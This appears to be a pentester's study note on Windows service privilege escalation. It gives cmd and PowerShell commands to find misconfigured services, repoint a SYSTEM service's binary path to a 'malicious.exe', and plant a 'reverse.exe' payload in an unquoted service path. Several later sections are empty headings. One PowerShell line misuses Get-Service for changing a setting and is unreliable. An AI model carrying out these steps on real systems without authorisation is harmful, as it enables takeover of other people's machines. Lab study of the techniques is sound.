#windows #privesc #services #cmd #registry

## Introduction 

Services are simply programs that run in the background  , accepting input or performing regular tasks.

If services run with SYSTEM privileges and are misconfigured , exploiting theme may lead to command execution with SYSTEM privileges as well.


# Services Commands

##### Query the configuration of a service :

```cmd
sc.exe qc <name>
```

```powershell 
Get-WmiObject win32_service | Where-Object { $_.Name -eq "<name>" }
```

#### Query the current status of a service :

```cmd
sc.exe query <name>
```

```powershell
Get-Service -Name <name>
```

#### Modify a configuration option of a service :

```cmd
sc.exe config <name> <option>= <value>
```

```powershell
Get-Service -Name <name> -StartupType <Manual|Automatic|Disabled>
```

#### Start / Stop a service :

```cmd
net start/stop <name>
```

```powershell
Start-Service -Name <name>
Stop-Service -Name <name>
```









#  1- Insecure Service Properties

If our user has permission to change the configuration of a service which runs with SYSTEM privileges , we can change the executable service and use to one of our own.

<span class="red-text">Potential Rabbit Hole :</span>
If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges 

```powershell
.\winPEASany.exe servicesinfo
```

##### Exemple of winPEAS out :

```bash
[+] Interesting Services -non Microsoft-(T1007)
    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] -         Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
```

We can see in Modifiable Services also in LinPEAS out :

```bash
[+] Modifiable Services(T1007)
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles
```


##  I - Verify permissions with accesscheck 

```cmd
.\accesschk.exe /accepteula -uwcqv <user> <ServiceName>
```

Verify with cmd:
```cmd
sc sdshow <Nom_du_Service>
```


Verify with Powershell : 
```powershell
Get-Service -Name <Nom_du_Service>
(Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\<Nom_du_Service>").Access

```

#### Exemple with DaclSvc service :
```cmd
C:\Tools>.\accesschk.exe /accepteula -uwcqv user daclsvc
.\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```


Query the service :
```cmd
sc qc daclsvc

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


```
---
##  II - Query the service 

```cmd
sc qc <serviceName>
```

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<SerName>" -Name ImagePath
```

Verify <span class="red-text">START_TYPE</span> , <span class="red-text">BINARY_PATH_NAME</span> and <span class="red-text">SERVICE_START_NAME</span>

Check the current status of a service :
```cmd
sc query <ServiceName>
```

Check the <span class="red-text">STATE</span>

---
## III - Change Binary Path 


```cmd
sc config <ServiceName> binpath= "\"C:\folder\malicous.exe\""
```

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<Nom_du_Service>" -Name ImagePath -Value "C:\Nouveau\Chemin\executable.exe"
```

--- 

Now Start the service 

```cmd
net start <ServiceName>
```
```powershell
Start-Service -Name <ServiceName>
```


---


#  2 - Unquoted Service Path
 
Executables in Windows can be run without using their extension ( e.g. "whoami.exe" can be run by just typing "whoami" ).

Some executables take arguments, separated by spaces , e.g someprog.exe arg1 arg2 arg3 
This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Command Powershell to find unquoted paths :

```powershell
Get-WmiObject win32_service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' } | Select-Object Name, PathName

```

##### Exemples of WinPeas Out :


```bash

unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - ==No quotes and Space detected==

```





## I - Verify permissions with accesschk

```cmd
.\accesschk.exe /accepteula -ucqv <user> <ServiceName>
```

## II - Verify ACL on each directory on the Bin Path 


With accesschk 
```cmd
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program File\"
.\accesschk.exe /accepteula -uwdq "C:\Program File\Unquoted Path Serice\"
```

With icacls  
```cmd
icacls "C:\Program Files\Unquoted Path Service"
```

With PowerShell 
```powershell
(Get-Acl "C:\Program Files\Unquoted Path Service").Access
```

## III - Copy Payload to the directory 

```cmd
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

And Run the service
#  3 - Weak Registry Permissions



#  4 - Insecure Service Executables
#  5 - DLL Hijacking